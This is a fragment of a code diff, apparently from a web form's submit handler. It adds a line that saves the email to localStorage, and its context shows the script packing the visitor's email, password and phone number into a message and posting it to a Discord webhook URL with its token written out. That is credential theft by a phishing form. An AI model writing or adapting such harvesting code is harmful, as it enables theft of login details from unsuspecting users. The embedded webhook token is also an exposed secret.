@@ -17,6 +17,7 @@ form.addEventListener("submit", async (event)=>
 
     else
     {
+        localStorage.setItem("email", email);
         const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}`;
         
         await fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
